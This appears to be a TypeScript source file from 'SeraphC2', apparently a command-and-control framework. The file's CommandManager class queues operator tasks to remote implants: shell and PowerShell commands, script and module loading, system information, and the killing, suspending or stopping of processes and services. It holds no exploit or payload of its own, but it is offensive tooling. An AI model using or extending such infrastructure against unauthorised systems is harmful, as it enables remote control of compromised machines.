/**
 * CommandManager - Manages command execution and provides interface for operators
 * Implements requirements 2.4, 4.1, 4.2, 4.3 from the SeraphC2 specification
 */

import { EventEmitter } from 'events';
import { CommandRouter } from './command-router';
import { ImplantManager } from './implant-manager';
import { CommandRepository } from '../repositories/interfaces';
import { PostgresCommandRepository } from '../repositories/command.repository';
import { Command, CommandType, CommandStatus } from '../../types/entities';
import { Logger } from '../../utils/logger';

export interface CommandExecutionRequest {
  implantId: string;
  operatorId: string;
  type: CommandType;
  payload: string;
  timeout?: number;
  priority?: number;
}

export interface CommandExecutionProgress {
  commandId: string;
  status: CommandStatus;
  progress?: number;
  message?: string;
  timestamp: Date;
}

export interface CommandHistoryFilter {
  implantId?: string;
  operatorId?: string;
  type?: CommandType;
  status?: CommandStatus;
  startDate?: Date;
  endDate?: Date;
  limit?: number;
  offset?: number;
}

export class CommandManager extends EventEmitter {
  private commandRouter: CommandRouter;
  private implantManager: ImplantManager;
  private commandRepository: CommandRepository;
  private logger: Logger;
  private activeCommands: Map<string, CommandExecutionProgress>;

  constructor(
    commandRouter: CommandRouter,
    implantManager: ImplantManager,
    commandRepository?: CommandRepository
  ) {
    super();
    this.commandRouter = commandRouter;
    this.implantManager = implantManager;
    this.commandRepository = commandRepository || new PostgresCommandRepository();
    this.logger = Logger.getInstance();
    this.activeCommands = new Map();

    this.setupEventHandlers();
  }

  /**
   * Execute a command on an implant
   */
  async executeCommand(request: CommandExecutionRequest): Promise<Command> {
    try {
      // Validate implant exists and is connected
      const implant = await this.implantManager.getImplant(request.implantId);
      if (!implant) {
        throw new Error(`Implant ${request.implantId} not found`);
      }

      const session = this.implantManager.getImplantSession(request.implantId);
      if (!session || !session.isActive) {
        throw new Error(`Implant ${request.implantId} is not connected`);
      }

      // Queue the command
      const command = await this.commandRouter.queueCommand(
        request.implantId,
        request.operatorId,
        request.type,
        request.payload,
        request.priority || 0
      );

      // Track command execution
      const progress: CommandExecutionProgress = {
        commandId: command.id,
        status: CommandStatus.PENDING,
        progress: 0,
        message: 'Command queued for execution',
        timestamp: new Date(),
      };

      this.activeCommands.set(command.id, progress);

      this.logger.info('Command execution requested', {
        commandId: command.id,
        implantId: request.implantId,
        operatorId: request.operatorId,
        type: request.type,
      });

      // Emit progress update
      this.emit('commandProgress', progress);

      // Start execution if implant is ready
      await this.commandRouter.startCommandExecution(command.id, request.timeout);

      return command;
    } catch (error) {
      this.logger.error('Failed to execute command', {
        error: error instanceof Error ? error.message : 'Unknown error',
        request,
      });
      throw error;
    }
  }

  /**
   * Cancel a command execution
   */
  async cancelCommand(commandId: string, operatorId: string): Promise<void> {
    try {
      const command = await this.commandRepository.findById(commandId);
      if (!command) {
        throw new Error(`Command ${commandId} not found`);
      }

      // Verify operator has permission to cancel this command
      if (command.operatorId !== operatorId) {
        // TODO: Add role-based permission check for administrators
        throw new Error('Insufficient permissions to cancel this command');
      }

      await this.commandRouter.cancelCommand(commandId);

      // Update progress tracking
      const progress = this.activeCommands.get(commandId);
      if (progress) {
        progress.status = CommandStatus.FAILED;
        progress.message = 'Command cancelled by operator';
        progress.timestamp = new Date();
        this.emit('commandProgress', progress);
      }

      this.logger.info('Command cancelled', {
        commandId,
        operatorId,
        implantId: command.implantId,
      });
    } catch (error) {
      this.logger.error('Failed to cancel command', {
        error: error instanceof Error ? error.message : 'Unknown error',
        commandId,
        operatorId,
      });
      throw error;
    }
  }

  /**
   * Get command status and result
   */
  async getCommandStatus(commandId: string): Promise<Command | null> {
    return this.commandRepository.findById(commandId);
  }

  /**
   * Get command history with filtering
   */
  async getCommandHistory(filter: CommandHistoryFilter): Promise<Command[]> {
    try {
      if (filter.implantId) {
        return this.commandRepository.getCommandHistory(
          filter.implantId,
          filter.limit || 50,
          filter.offset || 0
        );
      }

      if (filter.operatorId) {
        return this.commandRepository.findByOperatorId(filter.operatorId, filter.limit || 50);
      }

      if (filter.status) {
        return this.commandRepository.findByStatus(filter.status);
      }

      if (filter.startDate && filter.endDate) {
        return this.commandRepository.getCommandsByDateRange(filter.startDate, filter.endDate);
      }

      // Default: get all commands with limit
      const allCommands = await this.commandRepository.findAll();
      const limit = filter.limit || 50;
      const offset = filter.offset || 0;
      return allCommands.slice(offset, offset + limit);
    } catch (error) {
      this.logger.error('Failed to get command history', {
        error: error instanceof Error ? error.message : 'Unknown error',
        filter,
      });
      throw error;
    }
  }

  /**
   * Get pending commands for an implant
   */
  async getPendingCommands(implantId: string): Promise<Command[]> {
    return this.commandRouter.getPendingCommands(implantId);
  }

  /**
   * Get active command executions
   */
  getActiveCommands(): CommandExecutionProgress[] {
    return Array.from(this.activeCommands.values());
  }

  /**
   * Get command execution progress
   */
  getCommandProgress(commandId: string): CommandExecutionProgress | null {
    return this.activeCommands.get(commandId) || null;
  }

  /**
   * Execute a shell command
   */
  async executeShellCommand(
    implantId: string,
    operatorId: string,
    command: string,
    timeout?: number
  ): Promise<Command> {
    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.SHELL,
      payload: command,
      ...(timeout !== undefined && { timeout }),
    });
  }

  /**
   * Execute a PowerShell command
   */
  async executePowerShellCommand(
    implantId: string,
    operatorId: string,
    command: string,
    timeout?: number
  ): Promise<Command> {
    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.POWERSHELL,
      payload: command,
      ...(timeout !== undefined && { timeout }),
    });
  }

  /**
   * Execute a PowerShell script
   */
  async executePowerShellScript(
    implantId: string,
    operatorId: string,
    scriptContent: string,
    parameters?: { [key: string]: any },
    timeout?: number
  ): Promise<Command> {
    const payload = JSON.stringify({
      script: scriptContent,
      parameters: parameters || {},
    });

    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.POWERSHELL_SCRIPT,
      payload,
      ...(timeout !== undefined && { timeout }),
    });
  }

  /**
   * Load a PowerShell module
   */
  async loadPowerShellModule(
    implantId: string,
    operatorId: string,
    moduleName: string,
    moduleContent?: string,
    timeout?: number
  ): Promise<Command> {
    const payload = JSON.stringify({
      moduleName,
      moduleContent,
    });

    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.POWERSHELL_MODULE_LOAD,
      payload,
      ...(timeout !== undefined && { timeout }),
    });
  }

  /**
   * List loaded PowerShell modules
   */
  async listPowerShellModules(
    implantId: string,
    operatorId: string,
    timeout?: number
  ): Promise<Command> {
    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.POWERSHELL_MODULE_LIST,
      payload: 'Get-Module',
      ...(timeout !== undefined && { timeout }),
    });
  }

  /**
   * Get system information
   */
  async getSystemInfo(implantId: string, operatorId: string): Promise<Command> {
    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.SYSTEM_INFO,
      payload: 'systeminfo',
    });
  }

  /**
   * Get process list
   */
  async getProcessList(implantId: string, operatorId: string): Promise<Command> {
    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.PROCESS_LIST,
      payload: '',
    });
  }

  /**
   * Kill a process
   */
  async killProcess(
    implantId: string,
    operatorId: string,
    processId?: number,
    processName?: string
  ): Promise<Command> {
    const payload = JSON.stringify({
      processId,
      processName,
    });

    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.PROCESS_KILL,
      payload,
    });
  }

  /**
   * Suspend a process
   */
  async suspendProcess(implantId: string, operatorId: string, processId: number): Promise<Command> {
    const payload = JSON.stringify({ processId });

    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.PROCESS_SUSPEND,
      payload,
    });
  }

  /**
   * Resume a process
   */
  async resumeProcess(implantId: string, operatorId: string, processId: number): Promise<Command> {
    const payload = JSON.stringify({ processId });

    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.PROCESS_RESUME,
      payload,
    });
  }

  /**
   * Get service list
   */
  async getServiceList(implantId: string, operatorId: string): Promise<Command> {
    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.SERVICE_LIST,
      payload: '',
    });
  }

  /**
   * Start a service
   */
  async startService(implantId: string, operatorId: string, serviceName: string): Promise<Command> {
    const payload = JSON.stringify({ serviceName });

    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.SERVICE_START,
      payload,
    });
  }

  /**
   * Stop a service
   */
  async stopService(implantId: string, operatorId: string, serviceName: string): Promise<Command> {
    const payload = JSON.stringify({ serviceName });

    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.SERVICE_STOP,
      payload,
    });
  }

  /**
   * Restart a service
   */
  async restartService(
    implantId: string,
    operatorId: string,
    serviceName: string
  ): Promise<Command> {
    const payload = JSON.stringify({ serviceName });

    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.SERVICE_RESTART,
      payload,
    });
  }

  /**
   * Get system resources
   */
  async getSystemResources(implantId: string, operatorId: string): Promise<Command> {
    return this.executeCommand({
      implantId,
      operatorId,
      type: CommandType.SYSTEM_RESOURCES,
      payload: '',
    });
  }

  /**
   * Setup event handlers for command router events
   */
  private setupEventHandlers(): void {
    this.commandRouter.on('commandExecutionStarted', ({ command }) => {
      const progress = this.activeCommands.get(command.id);
      if (progress) {
        progress.status = CommandStatus.EXECUTING;
        progress.progress = 10;
        progress.message = 'Command execution started';
        progress.timestamp = new Date();
        this.emit('commandProgress', progress);
      }
    });

    this.commandRouter.on('commandExecutionCompleted', ({ command, result, status }) => {
      const progress = this.activeCommands.get(command.id);
      if (progress) {
        progress.status = status;
        progress.progress = 100;
        progress.message =
          status === CommandStatus.COMPLETED
            ? 'Command completed successfully'
            : 'Command completed with errors';
        progress.timestamp = new Date();
        this.emit('commandProgress', progress);

        // Clean up after a delay
        setTimeout(() => {
          this.activeCommands.delete(command.id);
        }, 30000); // Keep for 30 seconds for UI updates
      }

      this.emit('commandCompleted', {
        command,
        result,
        status,
      });
    });

    this.commandRouter.on('commandExecutionFailed', ({ command, error }) => {
      const progress = this.activeCommands.get(command.id);
      if (progress) {
        progress.status = CommandStatus.FAILED;
        progress.progress = 0;
        progress.message = `Command failed: ${error}`;
        progress.timestamp = new Date();
        this.emit('commandProgress', progress);

        // Clean up after a delay
        setTimeout(() => {
          this.activeCommands.delete(command.id);
        }, 30000);
      }

      this.emit('commandFailed', {
        command,
        error,
      });
    });

    this.commandRouter.on('commandTimeout', ({ command, timeout }) => {
      const progress = this.activeCommands.get(command.id);
      if (progress) {
        progress.status = CommandStatus.TIMEOUT;
        progress.progress = 0;
        progress.message = `Command timed out after ${timeout}ms`;
        progress.timestamp = new Date();
        this.emit('commandProgress', progress);

        // Clean up after a delay
        setTimeout(() => {
          this.activeCommands.delete(command.id);
        }, 30000);
      }

      this.emit('commandTimeout', {
        command,
        timeout,
      });
    });

    this.commandRouter.on('commandCancelled', ({ command }) => {
      const progress = this.activeCommands.get(command.id);
      if (progress) {
        progress.status = CommandStatus.FAILED;
        progress.message = 'Command cancelled';
        progress.timestamp = new Date();
        this.emit('commandProgress', progress);

        // Clean up immediately for cancelled commands
        this.activeCommands.delete(command.id);
      }

      this.emit('commandCancelled', {
        command,
      });
    });
  }

  /**
   * Stop the command manager
   */
  stop(): void {
    this.activeCommands.clear();
    this.removeAllListeners();
    this.logger.info('CommandManager stopped');
  }
}
